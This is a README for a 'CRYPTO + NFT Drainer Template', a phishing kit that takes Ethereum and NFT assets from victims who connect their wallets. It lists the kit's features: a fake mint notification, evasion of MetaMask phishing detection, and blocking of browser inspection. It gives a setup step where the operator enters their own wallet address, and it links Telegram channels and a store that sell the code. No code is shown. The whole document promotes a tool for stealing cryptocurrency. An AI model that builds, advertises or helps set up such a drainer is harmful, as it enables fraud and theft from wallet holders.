# ***🌙 GET CLEAN SOURCE CODE AT TELEGRAM: [@crypto_scem](https://t.me/crypto_scem)***
### <center>💎 DOWNLOAD WORKING VERSION: https://github.com/cryptoscemm/ethereum-drainer
### <center>💎 CRYPTO + NFT Drainer Template / ETH Drainer / NFT Drainer
![image](https://cdn.discordapp.com/attachments/986649854728089610/987037794805354546/unknown.png)
---

## `💧 Features`
- [x] Inspect Element Detection
- [x] No API needed
- [x] Fake Mint Notification
- [x] Custom & Cool Design
- [x] Instant transactions
- [x] No contract required
- [x] Anti Metamask Phishing Detections
- [x] Anti F12 Inspect

## `✏️ Setup Guide:` 
you need to edit the **settings.js** file. 
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**

To get instant support, contact me on [@crypto_scem](https://t.me/crypto_scem)

## `🌊 Socials`

- Telegram: https://t.me/crypto_scem
- Group: https://t.me/cryptoscemm
- Sellix Store: https://cryptoscem-services.sellix.io

##### Please ⭐ the repo to support this project & follow next updates
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
